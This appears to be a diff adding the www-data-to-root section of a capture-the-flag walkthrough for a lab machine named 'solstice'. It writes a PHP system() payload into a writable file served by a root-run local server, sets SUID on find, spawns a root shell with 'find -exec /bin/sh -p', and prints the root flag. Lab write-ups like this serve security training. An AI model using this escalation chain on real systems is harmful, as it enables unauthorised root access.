@@ -176,6 +176,48 @@ www-data@solstice:/var/tmp/webserver$
 
 ## www-data -> root
 
+After lot of enumeration, i noticed only 1 thing if you run `ps aux | grep root` you can see this : 
 
+`root       423  0.0  2.0 196744 21056 ?        S    07:45   0:00 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/`
 
+It's a php local server, `-t` specify the document for the built-in web server so if we go there we can see that we can edit the file.
 
+```
+www-data@solstice:/var/tmp/sv$ ls -la
+ls -la
+total 12
+drwsrwxrwx 2 root root 4096 Jun 26 15:36 .
+drwxrwxrwt 9 root root 4096 Jul  1 07:45 ..
+-rwxrwxrwx 1 root root   36 Jun 19 00:01 index.php
+```
+
+Server is running as root, so we can edit the file and add our payload in, we can do a trick and make the `find` binary SUID! ;-)
+
+```
+www-data@solstice:/var/tmp/sv$ > index.php
+www-data@solstice:/var/tmp/sv$ printf "<?php\nsystem('chmod o+x /usr/bin/find; chmod +s /usr/bin/find');\n?>" > index.php
+www-data@solstice:/var/tmp/sv$ cat index.php
+<?php
+system('chmod o+x /usr/bin/find; chmod +s /usr/bin/find');
+?>
+www-data@solstice:/var/tmp/sv$ curl http://127.0.0.1:57/index.php
+www-data@solstice:/var/tmp/sv$ find . -exec /bin/sh -p \; -quit
+find . -exec /bin/sh -p \; -quit
+whoami;id
+root
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+```
+
+Let's read the flag.
+
+```
+# cat /root/root.txt
+
+No ascii art for you >:(
+
+Thanks for playing! - Felipe Winsnes (@whitecr0wz)
+
+f950998f0d484a2ef1ea83ed4f42bbca
+```
+
+Interesting privesc! :)
